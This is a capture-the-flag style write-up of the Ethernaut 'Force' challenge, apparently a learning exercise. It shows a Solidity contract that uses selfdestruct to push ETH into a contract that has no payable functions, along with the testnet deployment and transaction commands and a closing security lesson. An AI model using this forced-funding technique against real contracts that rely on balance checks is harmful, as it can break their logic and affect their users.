# Ethernaut Challenge 07 — Force

This challenge demonstrates that a contract can receive ETH even if it does not implement a `receive()` or `fallback()` function.

The goal is to make the balance of the target contract greater than zero.

Instance address:

```
0x3Aa4E20aED5d03E82E58b68b89fF73F86d60016b
```

---

## 🎯 Goal

The challenge is solved when the balance of the `Force` contract becomes greater than zero.

---

## 🧠 Thought process

The `Force` contract is intentionally empty:

```solidity
contract Force { }
```

Since it does not implement `receive()` or `fallback()`, a normal ETH transfer to the contract would revert.

However, there is an important EVM property:

- ETH can be forced into a contract
- the most common way is through `selfdestruct`
- when `selfdestruct` executes, ETH is sent to the target address
- no code is executed on the target contract

This means that even though `Force` does not explicitly accept ETH, it can still end up with a positive balance if another contract self-destructs and sends its balance to it.

So the exploit is:

1. deploy an attacker contract
2. fund it with ETH
3. call a function that executes `selfdestruct(target)`
4. force ETH into the `Force` contract

---

## 🧪 Step 1 — Build an attacker contract

To solve the challenge, I wrote the following contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    function attack(address payable target) external {
        selfdestruct(target);
    }

    receive() external payable {}
}
```

This contract does two things:

- it can receive ETH through its `receive()` function
- it can later destroy itself and force-send its full balance to the target contract

---

## 🚀 Step 2 — Execute the exploit on Sepolia

Deploy the `ForceAttacker` contract:

```bash
forge create src/challenge-07-force/ForceAttacker.sol:ForceAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut \
  --broadcast
```

Deployed `ForceAttacker` address:

```
0x71C655653f3a60FE7ff933479d415bE7d9AE59F1
```

Now send some ETH to the attacker contract:

```bash
cast send 0x71C655653f3a60FE7ff933479d415bE7d9AE59F1 \
    --value 0.0001ether \
    --rpc-url $SEPOLIA_RPC_URL \
    --account ethernaut
```

Transaction hash:

```
0x23bbe9682e907775fa2a1b0208aedcdb679b5ba1556d07fec611eb8d54ee750c
```

Check the balance of the attacker contract:

```bash
cast balance 0x71C655653f3a60FE7ff933479d415bE7d9AE59F1 \
    --rpc-url $SEPOLIA_RPC_URL \
    --ether
```

Result:

```
0.000100000000000000
```

Now call the `attack()` function and pass the address of the `Force` contract:

```bash
cast send 0x71C655653f3a60FE7ff933479d415bE7d9AE59F1 \
  "attack(address)" 0x3Aa4E20aED5d03E82E58b68b89fF73F86d60016b \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

Transaction hash:

```
0x94235419f0e6809f92ef35d5836f9bd8fcea1ad1075d66c8893ae31d6d25d485
```

When this function executes, the attacker contract self-destructs and sends its ETH balance to the `Force` contract.

---

## ✅ Step 3 — Verify the result

Check the balance of the `Force` contract:

```bash
cast balance 0x3Aa4E20aED5d03E82E58b68b89fF73F86d60016b \
    --rpc-url $SEPOLIA_RPC_URL \
    --ether
```

Result:

```
0.000100000000000000
```

The balance is now greater than zero, so the challenge is completed.

---

## 🛡️ Security takeaway

This challenge shows that contracts cannot fully prevent receiving ETH.

Key lessons:

- a contract does not need `receive()` or `fallback()` to end up with ETH
- `selfdestruct` can force ETH into any target address
- assumptions based on `address(this).balance == 0` can be unsafe
- smart contracts should never rely on the idea that they can reject all incoming ETH

Any contract can be force-funded, even if it has no payable functions.